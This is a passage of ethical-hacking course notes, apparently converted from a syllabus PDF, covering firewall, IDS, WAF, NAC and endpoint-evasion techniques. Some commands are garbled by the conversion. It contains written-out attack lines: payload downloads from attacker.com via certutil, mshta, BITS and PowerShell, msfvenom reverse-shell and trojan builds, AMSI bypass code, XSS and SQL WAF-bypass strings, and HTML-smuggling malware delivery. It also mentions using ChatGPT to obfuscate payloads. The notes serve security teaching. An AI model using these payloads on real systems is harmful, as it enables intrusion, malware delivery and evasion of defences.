> 
> 
> 
> #### 🔹 3.5 Bypass Blocked Sites Using IP Address
> 
> 
> 
> #### 🔹 URL Filter Bypass:
> 
> 
> If organization blocks example.com, entering 192.168.1.10 bypasses URL-based filters
>
> ---
>

> [!NOTE]- 📄 **Pages 21 to 25 Syllabus Content**
>
> ### 📍 Page 21
>
> 
> #### 🔹 Technique:
> 
> 
> 
> #### 🔹 # Resolve IP address
> 
> 
> 
> #### 🔹 nslookup example.com
> 
> 
> 
> #### 🔹 dig example.com
> 
> 
> 
> #### 🔹 # Access via IP
> 
> 
> 
> #### 🔹 http://192.168.1.10
> 
> 
> 
> #### 🔹 Why Works:
> 
> 
> 
> #### 🔹 URL filters match domain names
> 
> 
> 
> #### 🔹 IP addresses bypass domain filtering
> 
> 
> 
> #### 🔹 Requires IP-based filtering for mitigation
> 
> 
> 
> #### 🔹 3.6 Using Anonymous Web-Surfing Sites
> 
> 
> 
> #### 🔹 Anonymizer Services:
> 
> 
> 
> #### 🔹 Proxy Sites:
> 
> 
> 
> #### 🔹 Web-based proxies
> 
> 
> 
> #### 🔹 Anonymous gateways
> 
> 
> 
> #### 🔹 Public anonymity proxies
> 
> 
> 
> #### 🔹 Examples: HideMyAss, ProxySite
> 
> 
> 
> #### 🔹 Bypass Method:
> 
> 
> 
> #### 🔹 User  Proxy Service  Blocked Website
> 
> 
> 
> #### 🔹 Techniques:
> 
> 
> 
> #### 🔹 HTTPS proxies
> 
> 
> 
> #### 🔹 SSL encryption
> 
> 
> 
> #### 🔹 Header modification
> 
> 
> 
> #### 🔹 IP masking
> 
> 
> 
> #### 🔹 3.7 Bypassing IDS/Firewall Using Proxy Server
> 
>
> ---
>
> ### 📍 Page 22
>
> 
> #### 🔹 Proxy-Based Evasion:
> 
> 
> Traffic routed through unmonitored or external proxy systems:
> 
> 
> #### 🔹 Corporate proxy abuse
> 
> 
> 
> #### 🔹 External proxy services
> 
> 
> 
> #### 🔹 SOCKS proxies
> 
> 
> 
> #### 🔹 VPN services
> 
> 
> 
> #### 🔹 Tools:
> 
> 
> 
> #### 🔹 # Proxychains configuration
> 
> 
> 
> #### 🔹 proxychains nmap target.com
> 
> 
> 
> #### 🔹 # Nmap through proxy
> 
> 
> 
> #### 🔹 nmap --proxies http://proxy:8080 target.com
> 
> 
> 
> #### 🔹 3.8 ICMP Tunneling
> 
> 
> 
> #### 🔹 ICMP Encapsulation:
> 
> 
> 
> #### 🔹 📡ICMP Tunneling
> 
> 
> Encapsulate data inside ICMP Echo Request/Reply packets to bypass firewall rules that allow ICMP traffic.
> 
> 
> #### 🔹 Attack Method:
> 
> 
> 
> #### 🔹 # PingTunnel server
> 
> 
> 
> #### 🔹 ptunnel -x password
> 
> 
> 
> #### 🔹 # PingTunnel client
> 
> 
> 
> #### 🔹 ptunnel -p proxy_ip -lp 8000 -da destination_ip -dp 80
> 
> 
> 
> #### 🔹 Tools:
> 
> 
> 
> #### 🔹 Loki  ICMP tunneling tool
> 
> 
> 
> #### 🔹 PingTunnel  TCP over ICMP
> 
> 
> 
> #### 🔹 Hans  IP over ICMP
> 
>
> ---
>
> ### 📍 Page 23
>
> 
> #### 🔹 Icmptx  ICMP tunnel
> 
> 
> 
> #### 🔹 Detection:
> 
> 
> 
> #### 🔹 Unusual ICMP payload sizes
> 
> 
> 
> #### 🔹 High ICMP traffic volume
> 
> 
> 
> #### 🔹 ICMP from unexpected sources
> 
> 
> 
> #### 🔹 3.9 ACK Tunneling
> 
> 
> 
> #### 🔹 TCP ACK Exploitation:
> 
> 
> 
> #### 🔹 Manipulate TCP ACK packets to bypass stateful inspection:
> 
> 
> Firewalls often allow ACK packets (part of established connections)
> 
> 
> #### 🔹 Attacker sends ACK packets without prior SYN
> 
> 
> 
> #### 🔹 Bypass stateful firewall rules
> 
> 
> 
> #### 🔹 Tools:
> 
> 
> 
> #### 🔹 AckCmd  ACK tunneling tool
> 
> 
> 
> #### 🔹 hping3  Craft ACK packets
> 
> 
> 
> #### 🔹 # hping3 ACK packet
> 
> 
> 
> #### 🔹 hping3 A -p 80 target.com
> 
> 
> 
> #### 🔹 3.10 HTTP Tunneling
> 
> 
> 
> #### 🔹 HTTP Encapsulation:
> 
> 
> 
> #### 🔹 🌐HTTP Tunneling
> 
> 
> Encapsulate other protocols SSH, FTP, RDP inside HTTP/HTTPS to evade firewall port restrictions, since HTTP 80/443 is usually allowed.
> 
> 
> #### 🔹 Tools:
> 
> 
> 
> #### 🔹 HTTPTunnel
> 
>
> ---
>
> ### 📍 Page 24
>
> 
> #### 🔹 # Server
> 
> 
> 
> #### 🔹 hts F target:22 8080
> 
> 
> 
> #### 🔹 # Client
> 
> 
> 
> #### 🔹 htc F 2222 proxy:8080
> 
> 
> 
> #### 🔹 ssh -p 2222 localhost
> 
> 
> 
> #### 🔹 reGeorg
> 
> 
> 
> #### 🔹 Web shell-based tunneling
> 
> 
> 
> #### 🔹 SOCKS proxy over HTTP
> 
> 
> 
> #### 🔹 Multi-protocol support
> 
> 
> 
> #### 🔹 Chisel
> 
> 
> 
> #### 🔹 Fast HTTP tunnel
> 
> 
> 
> #### 🔹 Encrypted tunneling
> 
> 
> 
> #### 🔹 Port forwarding
> 
> 
> 
> #### 🔹 3.11 SSH Tunneling
> 
> 
> 
> #### 🔹 SSH Port Forwarding:
> 
> 
> 
> #### 🔹 Encrypt malicious traffic through SSH channel:
> 
> 
> 
> #### 🔹 Local Port Forwarding:
> 
> 
> 
> #### 🔹 ssh L 8080:internal_host:80 user@ssh_server
> 
> 
> 
> #### 🔹 Remote Port Forwarding:
> 
> 
> 
> #### 🔹 ssh R 8080:localhost:80 user@ssh_server
> 
> 
> 
> #### 🔹 Dynamic Port Forwarding SOCKS
> 
> 
> 
> #### 🔹 ssh D 1080 user@ssh_server
> 
> 
> 
> #### 🔹 Benefits:
> 
> 
> 
> #### 🔹 Encrypted traffic
> 
> 
> 
> #### 🔹 2 4
> 
>
> ---
>
> ### 📍 Page 25
>
> 
> #### 🔹 Bypass firewall restrictions
> 
> 
> 
> #### 🔹 Legitimate protocol abuse
> 
> 
> 
> #### 🔹 3.12 DNS Tunneling
> 
> 
> 
> #### 🔹 DNS Exfiltration:
> 
> 
> 
> #### 🔹 🔍DNS Tunneling
> 
> 
> Encode data in DNS queries and responses to exfiltrate data or establish C2 communication, bypassing firewalls that allow DNS (port 53.
> 
> 
> #### 🔹 Attack Method:
> 
> 
> 
> #### 🔹 Malware encodes data  DNS query (subdomain.attacker.com)
> 
> 
> 
> #### 🔹 Attacker DNS server receives  Decodes data
> 
> 
> 
> #### 🔹 Response contains commands  Encoded in DNS response
> 
> 
> 
> #### 🔹 Tools:
> 
> 
> 
> #### 🔹 Iodine
> 
> 
> 
> #### 🔹 # Server
> 
> 
> 
> #### 🔹 iodined -f 10.0.0.1 tunnel.example.com
> 
> 
> 
> #### 🔹 # Client
> 
> 
> 
> #### 🔹 iodine -f tunnel.example.com
> 
> 
> 
> #### 🔹 DNSCat2
> 
> 
> 
> #### 🔹 # Server
> 
> 
> 
> #### 🔹 dnscat2 --dns domain=tunnel.com
> 
> 
> 
> #### 🔹 # Client
> 
> 
> 
> #### 🔹 ./dnscat2 tunnel.com
> 
> 
> 
> #### 🔹 Detection:
> 
> 
> 
> #### 🔹 Unusual DNS query patterns
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 26 to 30 Syllabus Content**
>
> ### 📍 Page 26
>
> 
> #### 🔹 High DNS query volume
> 
> 
> 
> #### 🔹 Long subdomain names
> 
> 
> 
> #### 🔹 Unexpected DNS traffic
> 
> 
> 
> #### 🔹 3.13 Bypassing via External Systems
> 
> 
> 
> #### 🔹 Pivot Point Usage:
> 
> 
> 
> #### 🔹 Use compromised hosts outside firewall as pivot points:
> 
> 
> 
> #### 🔹 Jump host  Route through external system
> 
> 
> 
> #### 🔹 Double pivoting  Chain multiple compromised hosts
> 
> 
> 
> #### 🔹 Cloud infrastructure  Abuse cloud services
> 
> 
> 
> #### 🔹 Third-party services  Legitimate services as proxy
> 
> 
> 
> #### 🔹 3.14 MITM-Based Evasion
> 
> 
> 
> #### 🔹 Man-in-the-Middle Bypass:
> 
> 
> 
> #### 🔹 Using ARP/DNS spoofing to bypass controls:
> 
> 
> 
> #### 🔹 ARP poisoning  Intercept and modify traffic
> 
> 
> 
> #### 🔹 DNS spoofing  Redirect to attacker-controlled systems
> 
> 
> 
> #### 🔹 SSL stripping  Downgrade encrypted connections
> 
> 
> 
> #### 🔹 Proxy injection  Force traffic through attacker proxy
> 
> 
> 
> #### 🔹 3.15 Content-Based Evasion
> 
> 
> 
> #### 🔹 Payload Obfuscation:
> 
> 
> 
> #### 🔹 Encode Payloads
> 
> 
> 
> #### 🔹 Base64 encoding
> 
> 
> 
> #### 🔹 URL encoding
> 
> 
> 
> #### 🔹 Hex encoding
> 
> 
> 
> #### 🔹 Unicode encoding
> 
> 
> 
> #### 🔹 Modify User-Agent
> 
> 
> 
> #### 🔹 Change browser signatures
> 
>
> ---
>
> ### 📍 Page 27
>
> 
> #### 🔹 Mimic legitimate clients
> 
> 
> 
> #### 🔹 Evade user-agent filtering
> 
> 
> 
> #### 🔹 Break Signatures
> 
> 
> 
> #### 🔹 Modify attack patterns
> 
> 
> 
> #### 🔹 Add noise/padding
> 
> 
> 
> #### 🔹 Polymorphic payloads
> 
> 
> 
> #### 🔹 3.16 Bypassing WAF Using XSS
> 
> 
> 
> #### 🔹 Web Application Firewall Evasion:
> 
> 
> 
> #### 🔹 Inject payloads that bypass WAF filters due to:
> 
> 
> 
> #### 🔹 Poor Input Validation
> 
> 
> 
> #### 🔹 <img src=x onerror=alert(1)>
> 
> 
> 
> #### 🔹 <svg/onload=alert(1)>
> 
> 
> 
> #### 🔹 Unicode Encoding
> 
> 
> 
> #### 🔹 <script>\u0061lert(1)</script>
> 
> 
> 
> #### 🔹 HTML Smuggling
> 
> 
> 
> #### 🔹 <form action=javascript:alert(1)>
> 
> 
> 
> #### 🔹 <input type=submit>
> 
> 
> 
> #### 🔹 </form>
> 
> 
> 
> #### 🔹 Case Manipulation
> 
> 
> 
> #### 🔹 ScRiPt>alert(1)</sCrIpT
> 
> 
> 
> #### 🔹 3.17 Other WAF Bypass Techniques
> 
> 
> 
> #### 🔹 Advanced Evasion:
> 
> 
> 
> #### 🔹 Multi-Encoding
> 
>
> ---
>
> ### 📍 Page 28
>
> 
> #### 🔹 %253Cscript%253E (double URL encoding)
> 
> 
> 
> #### 🔹 JSONBased Payloads
> 
> 
> 
> #### 🔹 {"data": "<script>alert(1)</script>"}
> 
> 
> 
> #### 🔹 Obfuscated Payloads
> 
> 
> 
> #### 🔹 eval(String.fromCharCode(97,108,101,114,116,40,49,41
> 
> 
> 
> #### 🔹 Base64/Hex Payloads
> 
> 
> 
> #### 🔹 eval(atob('YWxlcnQoMSk='))
> 
> 
> 
> #### 🔹 Chunked Encoding
> 
> 
> 
> #### 🔹 Transfer-Encoding: chunked
> 
> 
> 
> #### 🔹 Split payload across chunks
> 
> 
> 
> #### 🔹 Comment Insertion
> 
> 
> 
> #### 🔹 UN/**/ION SE/**/LECT
> 
> 
> 
> #### 🔹 Using Null Bytes
> 
> 
> 
> #### 🔹 <script\x00>alert(1)</script>
> 
> 
> 
> #### 🔹 HPP HTTP Parameter Pollution)
> 
> 
> 
> #### 🔹 ?id=1&id=2 UNION SELECT
> 
> 
> 
> #### 🔹 3.18 HTML Smuggling
> 
> 
> 
> #### 🔹 Browser-Based Delivery:
> 
>
> ---
>
> ### 📍 Page 29
>
> 
> #### 🔹 📦HTML Smuggling
> 
> 
> Deliver malware via JavaScript/HTML blobs reconstructed in the browser, bypassing traditional file scanning and email gateways.
> 
> 
> #### 🔹 Technique:
> 
> 
> 
> #### 🔹 <script>
> 
> 
> const blob = new Blob([malware_bytes], {type: 'application/octet-strea
> 
> 
> #### 🔹 m'});
> 
> 
> 
> #### 🔹 const url  URL.createObjectURL(blob);
> 
> 
> 
> #### 🔹 const a = document.createElement('a');
> 
> 
> 
> #### 🔹 a.href = url;
> 
> 
> 
> #### 🔹 a.download = 'document.exe';
> 
> 
> 
> #### 🔹 a.click();
> 
> 
> 
> #### 🔹 </script>
> 
> 
> 
> #### 🔹 Used By:
> 
> 
> 
> #### 🔹 APT campaigns Nobelium/Solarwinds)
> 
> 
> 
> #### 🔹 Ransomware delivery
> 
> 
> 
> #### 🔹 Bypassing email gateways
> 
> 
> 
> #### 🔹 Why Effective:
> 
> 
> 
> #### 🔹 Malware assembled client-side
> 
> 
> 
> #### 🔹 No malicious file in transit
> 
> 
> 
> #### 🔹 Bypasses gateway scanning
> 
> 
> 
> #### 🔹 3.19 Windows BITS Evasion
> 
> 
> 
> #### 🔹 Background Intelligent Transfer Service:
> 
> 
> Windows BITS can download/execute payloads bypassing some firewalls:
> 
> 
> #### 🔹 # BITS download
> 
> 
> Start-BitsTransfer Source http://attacker.com/malware.exe Destination
> 
> 
> #### 🔹 C\temp\file.exe
> 
>
> ---
>
> ### 📍 Page 30
>
> 
> #### 🔹 # Execute via BITS
> 
> 
> 
> #### 🔹 bitsadmin /create job1
> 
> 
> bitsadmin /addfile job1 http://attacker.com/malware.exe C\temp\file.exe
> 
> 
> #### 🔹 bitsadmin /resume job1
> 
> 
> 
> #### 🔹 Evasion Benefits:
> 
> 
> 
> #### 🔹 Legitimate Windows service
> 
> 
> 
> #### 🔹 Throttled transfers (less suspicious)
> 
> 
> 
> #### 🔹 Automatic retry on failure
> 
> 
> 
> #### 🔹 Bypasses simple firewall rules
> 
> 
> 
> #### 🔹 3.20 Additional IDS Evasion Techniques
> 
> 
> 
> #### 🔹 Insertion Attacks
> 
> 
> 
> #### 🔹 Mechanism: IDS adds extra packets causing misinterpretation
> 
> 
> 
> #### 🔹 Conflicting TCP options
> 
> 
> 
> #### 🔹 TTL manipulation
> 
> 
> 
> #### 🔹 Inconsistent fragmentation
> 
> 
> 
> #### 🔹 Evasion
> 
> 
> 
> #### 🔹 Attacker changes payload to avoid detection
> 
> 
> 
> #### 🔹 Modify attack signatures
> 
> 
> 
> #### 🔹 Polymorphic code
> 
> 
> 
> #### 🔹 Encryption
> 
> 
> 
> #### 🔹 DoS Against IDS
> 
> 
> 
> #### 🔹 Overwhelm IDS to disable detection
> 
> 
> 
> #### 🔹 Flood with traffic
> 
> 
> 
> #### 🔹 Resource exhaustion
> 
> 
> 
> #### 🔹 Crash IDS service
> 
> 
> 
> #### 🔹 Obfuscation
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 31 to 35 Syllabus Content**
>
> ### 📍 Page 31
>
> 
> #### 🔹 Encode/pack/encrypt traffic
> 
> 
> 
> #### 🔹 Code obfuscation
> 
> 
> 
> #### 🔹 String encoding
> 
> 
> 
> #### 🔹 Packer usage
> 
> 
> 
> #### 🔹 False Positive Generation
> 
> 
> 
> #### 🔹 Cause IDS overload with fake alerts
> 
> 
> 
> #### 🔹 Generate massive alerts
> 
> 
> 
> #### 🔹 Alert fatigue
> 
> 
> 
> #### 🔹 Hide real attacks
> 
> 
> 
> #### 🔹 Session Splicing
> 
> 
> 
> #### 🔹 Split malicious payload into small packets
> 
> 
> 
> #### 🔹 Time-delayed fragments
> 
> 
> 
> #### 🔹 Out-of-order delivery
> 
> 
> 
> #### 🔹 IDS timeout exploitation
> 
> 
> 
> #### 🔹 Unicode Evasion
> 
> 
> 
> #### 🔹 Using encoded characters to disguise payload
> 
> 
> 
> #### 🔹 %u0061lert Unicode encoding of 'alert')
> 
> 
> 
> #### 🔹 Fragmentation Attack
> 
> 
> 
> #### 🔹 Piece malware across TCP fragments
> 
> 
> 
> #### 🔹 IP fragmentation
> 
> 
> 
> #### 🔹 TCP segmentation
> 
> 
> 
> #### 🔹 Overlapping fragments
> 
> 
> 
> #### 🔹 TTL Attacks
> 
> 
> 
> #### 🔹 Manipulate TTL so packets expire before IDS sees them
> 
> 
> 
> #### 🔹 Short TTL to target
> 
>
> ---
>
> ### 📍 Page 32
>
> 
> #### 🔹 Longer TTL for IDS
> 
> 
> 
> #### 🔹 IDS sees different packet stream
> 
> 
> 
> #### 🔹 Urgency Flag Exploits
> 
> 
> 
> #### 🔹 Manipulate TCP URG Urgent) flag
> 
> 
> 
> #### 🔹 Bypass inspection
> 
> 
> 
> #### 🔹 Priority processing abuse
> 
> 
> 
> #### 🔹 Invalid RST Packets
> 
> 
> 
> #### 🔹 Send crafted RST packets to disrupt IDS state
> 
> 
> 
> #### 🔹 Desynchronize IDS tracking
> 
> 
> 
> #### 🔹 Connection hijacking
> 
> 
> 
> #### 🔹 Polymorphic Shellcode
> 
> 
> 
> #### 🔹 Code that changes/mutates to avoid signature detection
> 
> 
> 
> #### 🔹 Runtime code modification
> 
> 
> 
> #### 🔹 Self-modifying code
> 
> 
> 
> #### 🔹 Variable encryption keys
> 
> 
> 
> #### 🔹 ASCII Shellcode
> 
> 
> 
> #### 🔹 Encoded payload disguised as plaintext
> 
> 
> 
> #### 🔹 Alphanumeric shellcode
> 
> 
> 
> #### 🔹 Printable character constraints
> 
> 
> 
> #### 🔹 Bypasses binary filters
> 
> 
> 
> #### 🔹 Application-Layer Attacks
> 
> 
> 
> #### 🔹 WAF bypass using web application logic flaws
> 
> 
> 
> #### 🔹 Business logic abuse
> 
> 
> 
> #### 🔹 Parameter tampering
> 
> 
> 
> #### 🔹 Workflow violations
> 
> 
> 
> #### 🔹 Desynchronization Attacks
> 
>
> ---
>
> ### 📍 Page 33
>
> 
> #### 🔹 Desync server and IDS state
> 
> 
> 
> #### 🔹 TCP sequence manipulation
> 
> 
> 
> #### 🔹 Conflicting interpretations
> 
> 
> 
> #### 🔹 State confusion
> 
> 
> 
> #### 🔹 Domain Generation Algorithm (DGA)
> 
> 
> 
> #### 🔹 Generate many random domains for C2 communication
> 
> 
> 
> #### 🔹 Dynamic domain creation
> 
> 
> 
> #### 🔹 Difficult to blacklist
> 
> 
> 
> #### 🔹 Resilient C2
> 
> 
> 
> #### 🔹 Encryption
> 
> 
> 
> #### 🔹 Use TLS/SSH to hide content
> 
> 
> 
> #### 🔹 Encrypted payload delivery
> 
> 
> 
> #### 🔹 TLS 1.3 full encryption
> 
> 
> 
> #### 🔹 VPN tunneling
> 
> 
> 
> #### 🔹 Flooding
> 
> 
> 
> #### 🔹 Overload IDS with high traffic volume
> 
> 
> 
> #### 🔹 Bandwidth saturation
> 
> 
> 
> #### 🔹 Resource exhaustion
> 
> 
> 
> #### 🔹 Detection blindness
> 
> 
> 
> #### 🔹 4. Evading NAC & Endpoint Security
> 
> 
> 
> #### 🔹 4.1 NAC (Network Access Control) Evasion
> 
> 
> 
> #### 🔹 NAC Bypass Techniques:
> 
> 
> 
> #### 🔹 MAC Spoofing
> 
> 
> 
> #### 🔹 Clone authorized MAC address
> 
>
> ---
>
> ### 📍 Page 34
>
> 
> #### 🔹 # Linux
> 
> 
> 
> #### 🔹 ifconfig eth0 hw ether 001122334455
> 
> 
> 
> #### 🔹 # macchanger
> 
> 
> 
> #### 🔹 macchanger -m 001122334455 eth0
> 
> 
> 
> #### 🔹 Rogue DHCP
> 
> 
> 
> #### 🔹 Deploy unauthorized DHCP server
> 
> 
> 
> #### 🔹 Provide network access
> 
> 
> 
> #### 🔹 Bypass NAC checks
> 
> 
> 
> #### 🔹 VLAN Hopping
> 
> 
> 
> #### 🔹 Switch spoofing
> 
> 
> 
> #### 🔹 Double tagging
> 
> 
> 
> #### 🔹 Access restricted VLANs
> 
> 
> 
> #### 🔹 Pre-Auth Device Spoofing
> 
> 
> 
> #### 🔹 Clone registered device identity
> 
> 
> 
> #### 🔹 Bypass authentication requirements
> 
> 
> 
> #### 🔹 4.2 VLAN Hopping
> 
> 
> 
> #### 🔹 🚀VLAN Hopping
> 
> 
> Access traffic on VLANs that should be isolated and restricted through switch spoofing or double tagging attacks.
> 
> 
> #### 🔹 Two Methods:
> 
> 
> 
> #### 🔹 Switch Spoofing
> 
> 
> 
> #### 🔹 Attacker negotiates trunk with switch
> 
> 
> 
> #### 🔹 Send DTP Dynamic Trunking Protocol) messages
> 
> 
> 
> #### 🔹 Gain access to all VLANs
> 
> 
> 
> #### 🔹 Double Tagging
> 
>
> ---
>
> ### 📍 Page 35
>
> 
> #### 🔹 Insert two VLAN tags
> 
> 
> 
> #### 🔹 First tag stripped by first switch
> 
> 
> 
> #### 🔹 Second tag routes to different VLAN
> 
> 
> 
> #### 🔹 Mitigation:
> 
> 
> 
> #### 🔹 Disable DTP on access ports
> 
> 
> 
> #### 🔹 Manual trunk configuration
> 
> 
> 
> #### 🔹 Use native VLAN other than 1
> 
> 
> 
> #### 🔹 4.3 Pre-Authenticated Device Spoofing
> 
> 
> 
> #### 🔹 Identity Cloning:
> 
> 
> 
> #### 🔹 Clone registered device's MAC/IP to bypass NAC
> 
> 
> 
> #### 🔹 Attack Steps:
> 
> 
> 
> #### 🔹  Identify authorized device
> 
> 
> 
> #### 🔹  Clone MAC address
> 
> 
> 
> #### 🔹  Obtain IP address (static or DHCP
> 
> 
> 
> #### 🔹  Spoof device identity
> 
> 
> 
> #### 🔹  Bypass NAC authentication
> 
> 
> 
> #### 🔹 4.4 Endpoint Security Evasion Techniques
> 
> 
> 
> #### 🔹 Ghostwriting
> 
> 
> 
> #### 🔹 Modifying malware code to bypass signatures
> 
> 
> 
> #### 🔹 Change function names
> 
> 
> 
> #### 🔹 Reorder code
> 
> 
> 
> #### 🔹 Add junk code
> 
> 
> 
> #### 🔹 Modify strings
> 
> 
> 
> #### 🔹 Application Whitelisting Bypass
> 
> 
> 
> #### 🔹 Using trusted processes to execute malicious content
> 
> 
> 
> #### 🔹 DLL side-loading  Load malicious DLL via trusted app
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 36 to 40 Syllabus Content**
>
> ### 📍 Page 36
>
> 
> #### 🔹 Process hollowing  Replace legitimate process memory
> 
> 
> 
> #### 🔹 Parent process spoofing  Fake parent process
> 
> 
> 
> #### 🔹 Dechaining Macros
> 
> 
> 
> #### 🔹 Break macro chains to evade detection
> 
> 
> 
> #### 🔹 Split malicious code
> 
> 
> 
> #### 🔹 Multiple stage execution
> 
> 
> 
> #### 🔹 Time-delayed execution
> 
> 
> 
> #### 🔹 Clearing Memory Hooks
> 
> 
> 
> #### 🔹 Disable or manipulate API hooking
> 
> 
> 
> #### 🔹 Unhook security functions
> 
> 
> 
> #### 🔹 Direct syscalls
> 
> 
> 
> #### 🔹 Bypass EDR hooks
> 
> 
> 
> #### 🔹 Process Injection
> 
> 
> 
> #### 🔹 Injection Techniques:
> 
> 
> 
> #### 🔹 Reflective DLL Injection
> 
> 
> 
> #### 🔹 Load DLL directly from memory
> 
> 
> 
> #### 🔹 No file on disk
> 
> 
> 
> #### 🔹 Bypass file scanning
> 
> 
> 
> #### 🔹 Process Hollowing
> 
> 
> 
> #### 🔹 1. Create suspended process
> 
> 
> 
> #### 🔹 2. Unmap legitimate code
> 
> 
> 
> #### 🔹 3. Write malicious code
> 
> 
> 
> #### 🔹 4. Resume execution
> 
> 
> 
> #### 🔹 APC Injection
> 
> 
> 
> #### 🔹 Asynchronous Procedure Call injection
> 
> 
> 
> #### 🔹 Queue APC to thread
> 
> 
> 
> #### 🔹 Execute in context of process
> 
>
> ---
>
> ### 📍 Page 37
>
> 
> #### 🔹 Thread Hijacking
> 
> 
> 
> #### 🔹 Suspend thread
> 
> 
> 
> #### 🔹 Modify instruction pointer
> 
> 
> 
> #### 🔹 Resume with malicious code
> 
> 
> 
> #### 🔹 LoLBins (Living-off-the-Land Binaries)
> 
> 
> 
> #### 🔹 🏃Living-off-the-Land Binaries LoLBins)
> 
> 
> Abuse legitimate Windows built-in tools and utilities to perform malicious actions, evading detection since they're signed and trusted.
> 
> 
> #### 🔹 Common LoLBins:
> 
> 
> 
> #### 🔹 PowerShell
> 
> 
> powershell -ep bypass -nop -c "IEXNew-Object Net.WebClient).Download
> 
> 
> #### 🔹 String('http://attacker.com/payload.ps1')"
> 
> 
> 
> #### 🔹 MSHTA
> 
> 
> 
> #### 🔹 mshta http://attacker.com/payload.hta
> 
> 
> 
> #### 🔹 Certutil
> 
> 
> certutil -urlcache -f http://attacker.com/malware.exe malware.exe
> 
> 
> #### 🔹 Rundll32
> 
> 
> rundll32 javascript:"\..\mshtml,RunHTMLApplication ";alert(1)
> 
> 
> #### 🔹 Others:
> 
> 
> 
> #### 🔹 BITSAdmin  Background downloads
> 
> 
> 
> #### 🔹 Regsvr32  Execute scriptlets
> 
> 
> 
> #### 🔹 Wmic  Remote command execution
> 
> 
> 
> #### 🔹 Msiexec  Install remote MSI
> 
>
> ---
>
> ### 📍 Page 38
>
> 
> #### 🔹 CPL Side-Loading
> 
> 
> 
> #### 🔹 Load malicious control panel applets
> 
> 
> 
> #### 🔹 Create malicious .cpl file
> 
> 
> 
> #### 🔹 Load via rundll32 or control.exe
> 
> 
> 
> #### 🔹 Execute arbitrary code
> 
> 
> 
> #### 🔹 Using ChatGPT for Evasion
> 
> 
> 
> #### 🔹 Generating obfuscated payloads
> 
> 
> 
> #### 🔹 Note: Content filtered in real platforms
> 
> 
> 
> #### 🔹 AI-generated code obfuscation
> 
> 
> 
> #### 🔹 Polymorphic payload creation
> 
> 
> 
> #### 🔹 Social engineering content
> 
> 
> 
> #### 🔹 Metasploit Template Bypass
> 
> 
> 
> #### 🔹 Custom stagers and encoders
> 
> 
> 
> #### 🔹 # Generate encoded payload
> 
> 
> msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT4
> 
> 
> #### 🔹 444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
> 
> 
> 
> #### 🔹 # Custom template
> 
> 
> msfvenom -p windows/meterpreter/reverse_tcp -x notepad.exe -f exe > tro
> 
> 
> #### 🔹 janed.exe
> 
> 
> 
> #### 🔹 AMSI Bypass
> 
> 
> 
> #### 🔹 Anti-Malware Scan Interface Evasion:
> 
> 
> 
> #### 🔹 🛡AMSI Bypass
> 
> 
> 
> #### 🔹 PowerShell and script execution bypass techniques to evade
> 
> 
> Windows Anti-Malware Scan Interface scanning.
> 
> 
> #### 🔹 Techniques:
> 
>
> ---
>
> ### 📍 Page 39
>
> 
> #### 🔹 # Reflection-based AMSI bypass
> 
> 
> [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetF ield('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
> 
> 
> #### 🔹 # Memory patching
> 
> 
> $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if $b.Name -like "*iUtil s") $c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if $e. Name -like "*Context") $f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;Int 32$buf = 0;System.Runtime.InteropServices.Marshal]::Copy($buf, 0,
> 
> 
> #### 🔹 $ptr, 1
> 
> 
> 
> #### 🔹 Obfuscation:
> 
> 
> 
> #### 🔹 String concatenation
> 
> 
> 
> #### 🔹 Base64 encoding
> 
> 
> 
> #### 🔹 Variable substitution
> 
> 
> 
> #### 🔹 Comment insertion
> 
> 
> 
> #### 🔹 5. IDS/Firewall Evading Tools
> 
> 
> 
> #### 🔹 Evasion Toolkit:
> 
> 
> 
> #### 🔹 Fragroute/Fragrouter
> 
> 
> 
> #### 🔹 Packet fragmentation
> 
> 
> 
> #### 🔹 Traffic manipulation
> 
> 
> 
> #### 🔹 IDS evasion testing
> 
> 
> 
> #### 🔹 echo "tcp_seg 8" | fragroute target.com
> 
> 
> 
> #### 🔹 hping3
> 
> 
> 
> #### 🔹 Packet crafting
> 
> 
> 
> #### 🔹 Spoofing capabilities
> 
> 
> 
> #### 🔹 Firewall testing
> 
>
> ---
>
> ### 📍 Page 40
>
> 
> #### 🔹 hping3 S -p 80 --flood target.com
> 
> 
> 
> #### 🔹 Ettercap
> 
> 
> 
> #### 🔹 MITM attacks
> 
> 
> 
> #### 🔹 Packet injection
> 
> 
> 
> #### 🔹 Traffic manipulation
> 
> 
> 
> #### 🔹 ettercap T M arp:remote /target/ /gateway/
> 
> 
> 
> #### 🔹 Scapy
> 
> 
> 
> #### 🔹 Python packet manipulation
> 
> 
> 
> #### 🔹 Custom packet crafting
> 
> 
> 
> #### 🔹 Protocol testing
> 
> 
> 
> #### 🔹 from scapy.all import *
> 
> 
> 
> #### 🔹 send(IP(dst="target.com")/TCP(dport=80,flags="S"))
> 
> 
> 
> #### 🔹 Proxychains
> 
> 
> 
> #### 🔹 Chain multiple proxies
> 
> 
> 
> #### 🔹 Force TCP connections through proxy
> 
> 
> 
> #### 🔹 proxychains nmap -sT target.com
> 
> 
> 
> #### 🔹 Tor
> 
> 
> 
> #### 🔹 Anonymity network
> 
> 
> 
> #### 🔹 Traffic encryption
> 
> 
> 
> #### 🔹 IP masking
> 
> 
> 
> #### 🔹 DNSCat2
> 
> 
> 
> #### 🔹 DNS tunneling
> 
> 
> 
> #### 🔹 C2 over DNS
> 
> 
> 
> #### 🔹 Data exfiltration
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 41 to 45 Syllabus Content**
>
> ### 📍 Page 41
>
> 
> #### 🔹 Iodine
> 
> 
> 
> #### 🔹 IP over DNS tunnel
> 
> 
> 
> #### 🔹 Firewall bypass
> 
> 
> 
> #### 🔹 Encrypted tunneling
> 
> 
> 
> #### 🔹 reGeorg
> 
> 
> 
> #### 🔹 HTTP tunneling
> 
> 
> 
> #### 🔹 SOCKS proxy over HTTP
> 
> 
> 
> #### 🔹 Web shell-based tunneling
> 
> 
> 
> #### 🔹 6. Honeypot Concepts
> 
> 
> 
> #### 🔹 6.1 Honeypot
> 
> 
> 
> #### 🔹 🍯Honeypot Definition
> 
> 
